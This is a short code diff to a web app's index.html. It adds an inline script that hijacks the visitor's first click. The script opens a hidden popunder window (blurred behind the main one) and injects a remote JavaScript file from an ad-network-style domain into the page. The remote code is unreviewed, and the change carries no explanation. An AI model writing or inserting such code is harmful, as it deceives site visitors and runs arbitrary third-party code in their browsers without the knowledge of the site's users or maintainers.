@@ -16,5 +16,23 @@
   <body>
     <div id="root"></div>
     <script type="module" src="/src/main.tsx"></script>
+    <script>
+      (function() {
+        if (sessionStorage.getItem('popunder_shown')) return;
+        function handleFirstClick() {
+          sessionStorage.setItem('popunder_shown', '1');
+          document.removeEventListener('click', handleFirstClick);
+          var w = window.open('about:blank', '_blank');
+          if (w) {
+            w.blur();
+            window.focus();
+          }
+          var s = document.createElement('script');
+          s.src = 'https://pl28685678.effectivegatecpm.com/28/39/31/2839311f7eebefb36dab99aa0e5423a4.js';
+          document.body.appendChild(s);
+        }
+        document.addEventListener('click', handleFirstClick);
+      })();
+    </script>
   </body>
 </html>
